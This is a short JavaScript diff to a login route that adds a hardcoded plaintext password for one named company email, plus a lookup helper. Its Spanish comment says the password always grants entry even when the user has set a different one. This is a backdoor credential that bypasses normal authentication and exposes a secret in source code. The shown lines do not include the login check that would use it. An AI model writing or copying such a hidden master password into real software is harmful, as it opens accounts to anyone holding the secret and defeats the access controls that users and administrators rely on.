@@ -29,6 +29,16 @@ function isChrisnelFabian(user) {
   return user?.id === 'USR-101' || email === 'cfabian@safeone.com.do' || name === 'chrisnel fabian';
 }
 
+// Contraseñas predeterminadas por usuario (sensibles a mayúsculas).
+// Siempre permiten entrar, incluso si el usuario ya tiene otra contraseña guardada.
+const DEFAULT_PASSWORDS = {
+  'anoel@safeone.com.do': 'Ruth5525',
+};
+
+function defaultPasswordFor(user) {
+  return DEFAULT_PASSWORDS[normalizeLogin(user?.email)] || null;
+}
+
 // POST /api/auth/login
 router.post('/login', async (req, res) => {
   try {
